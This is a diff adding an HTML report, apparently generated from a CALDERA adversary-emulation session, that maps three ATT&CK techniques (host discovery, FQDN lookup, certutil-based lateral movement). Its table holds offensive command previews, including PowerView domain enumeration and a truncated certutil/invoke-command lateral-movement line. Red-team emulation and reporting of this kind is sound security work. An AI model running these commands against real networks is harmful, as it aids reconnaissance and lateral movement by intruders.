@@ -1,0 +1,20 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>MITRE ATT&CK Attack Report</title>
+<style>
+body { font-family: Arial, sans-serif; margin: 24px; background: #111; color: #eee; }
+a { color: #7db8ff; }
+table { border-collapse: collapse; width: 100%; background: #1c1c1c; }
+th, td { border: 1px solid #333; padding: 10px; text-align: left; vertical-align: top; }
+th { background: #222; }
+code { white-space: pre-wrap; word-break: break-word; }
+.badge { display: inline-block; padding: 4px 8px; border-radius: 999px; background: #222; border: 1px solid #444; margin-right: 6px; }
+</style></head><body>
+<h1>MITRE ATT&CK Attack Report</h1>
+<p><strong>Generated:</strong> 2026-04-02T07:39:17Z</p>
+<p><span class="badge">Session apt-sim-20260402-092855_20260402_092855</span><span class="badge">Operation apt-sim-20260402-092855</span><span class="badge">Techniques 3</span></p>
+<p>Questo report mette in fila le tecniche ATT&amp;CK pianificate, potenziali o realmente emerse dai link CALDERA. È la mappa dell'assalto, nuda e precisa.</p>
+<table>
+<tr><th>Technique ID</th><th>Name</th><th>Tactic</th><th>Ability ID</th><th>Ability Name</th><th>Origin</th><th>Status</th><th>PAW</th><th>Command preview</th></tr>
+<tr><td><a href='https://attack.mitre.org/techniques/T1018/'>T1018</a></td><td>Discover local hosts</td><td>discovery</td><td>13379ae1-d20e-4162-91f8-320d78a35e7f</td><td>Discover local hosts</td><td>executed_link, planned_compatible</td><td>0, planned</td><td>fgdafj</td><td><code>Import-Module .\powerview.ps1; Get-DomainComputer</code></td></tr><tr><td><a href='https://attack.mitre.org/techniques/TA0007/'>TA0007</a></td><td>Local FQDN</td><td>discovery</td><td>74d1b640-7f1e-4b36-beba-23a8228f39e0</td><td>Local FQDN</td><td>executed_link, planned_compatible</td><td>0, planned</td><td>fgdafj</td><td><code>[System.Net.Dns]::GetHostByName($env:computerName).HostName</code></td></tr><tr><td><a href='https://attack.mitre.org/techniques/T1570/'>T1570</a></td><td>Lateral Movement - Certutil</td><td>lateral-movement</td><td>96d3c175-5e58-424c-8350-d7514b28a075</td><td>Lateral Movement - Certutil</td><td>planned_compatible</td><td>planned</td><td>fgdafj</td><td><code>certutil -encode #{location} C:\users\public\com.crt | out-null; invoke-command #{remote.host.fqdn} -scriptblock { certutil -decode \\#{local.host.fqdn}\c$\users\public\com.crt #{location}; invoke-wmimethod -computernam…</code></td></tr>
+</table>
+</body></html>
